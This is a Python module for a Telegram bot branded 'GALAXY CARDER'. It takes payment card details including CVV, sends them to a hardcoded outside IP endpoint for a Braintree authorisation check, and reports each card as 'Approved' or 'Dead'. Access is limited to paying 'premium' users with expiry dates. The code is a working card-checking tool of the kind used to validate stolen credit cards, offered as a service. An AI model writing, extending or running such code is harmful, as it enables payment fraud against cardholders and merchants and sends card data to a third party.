import requests
import time
import os

ID_FILE = "id.txt"

def is_premium_user(user_id):
    try:
        if not os.path.exists(ID_FILE):
            return False

        valid_users = []
        is_valid = False

        with open(ID_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    stored_id, expiry = parts
                    if str(user_id) == stored_id:
                        if time.time() < float(expiry):
                            is_valid = True
                            valid_users.append(line)
                    else:
                        valid_users.append(line)

        with open(ID_FILE, "w") as file:
            file.writelines(valid_users)

        return is_valid
    except Exception as e:
        print(f"Error checking premium user: {e}")
        return False

def send_progress_message(bot, chat_id):
    progress = [
        "<b>🔄 Processing Card...</b>",
        "<b>🔄 Checking Details...</b>",
        "<b>🔄 Verifying with Braintree...</b>",
        "<b>🔄 Almost Done...</b>",
    ]
    msg = bot.send_message(chat_id, progress[0], parse_mode="HTML")
    for i in range(1, len(progress)):
        time.sleep(2)
        bot.edit_message_text(progress[i], chat_id, msg.message_id, parse_mode="HTML")
    return msg

def format_b3_response(api_data, time_taken):
    card = api_data.get("cc", "N/A")
    response = api_data.get("response", "N/A")
    status = api_data.get("status", "N/A")
    time_taken_api = api_data.get("time", f"{time_taken:.2f} seconds")

    parts = card.split("|")
    card_num = parts[0] if len(parts) > 0 else "N/A"
    exp = parts[1] + "/" + parts[2] if len(parts) > 2 else "N/A"
    cvv = parts[3] if len(parts) > 3 else "N/A"

    if "declined" in status.lower():
        status_icon = "❌ Dead"
    elif "approved" in status.lower() or "live" in status.lower():
        status_icon = "✅ Approved"
    else:
        status_icon = "⚠️ Unknown"

    message = f"""
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>🔥 𝐁𝐑𝐀𝐈𝐍𝐓𝐑𝐄𝐄 𝐀𝐔𝐓𝐇 🔥</b>
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>💳 𝑪𝒂𝒓𝒅:</b> <code>{card_num}</code>
<b>📆 𝑬𝒙𝒑𝒊𝒓𝒚:</b> <code>{exp}</code>
<b>🔑 𝑪𝑽𝑽:</b> <code>{cvv}</code>
<b>📌 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆:</b> <b><i>{response}</i></b>
<b>⚡ 𝑺𝒕𝒂𝒕𝒖𝒔:</b> <b><i>{status_icon}</i></b>
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>⏱ Time Taken:</b> <code>{time_taken_api}</code>
<b>👑 𝘽𝙊𝙏 𝘽𝙔:</b> <code>GALAXY CARDER 🥷</code>
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
"""
    return message

def check_braintree(bot, message, card_details):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_premium_user(user_id):
        bot.send_message(chat_id, "<b>🚫 Access Denied:</b> You are not a premium user or your access has expired.", parse_mode="HTML")
        return

    progress_msg = send_progress_message(bot, chat_id)

    try:
        start_time = time.time()
        url = f"http://194.164.150.141:3333/key=never/cc={card_details}"
        response = requests.get(url, timeout=20)

        if response.status_code == 200:
            api_data = response.json()
            formatted_response = format_b3_response(api_data, time.time() - start_time)
        else:
            formatted_response = "<b>❌ Error:</b> Unable to process request."
    except Exception as e:
        formatted_response = f"<b>❌ Exception:</b> <code>{e}</code>"

    bot.edit_message_text(formatted_response, chat_id, progress_msg.message_id, parse_mode="HTML")
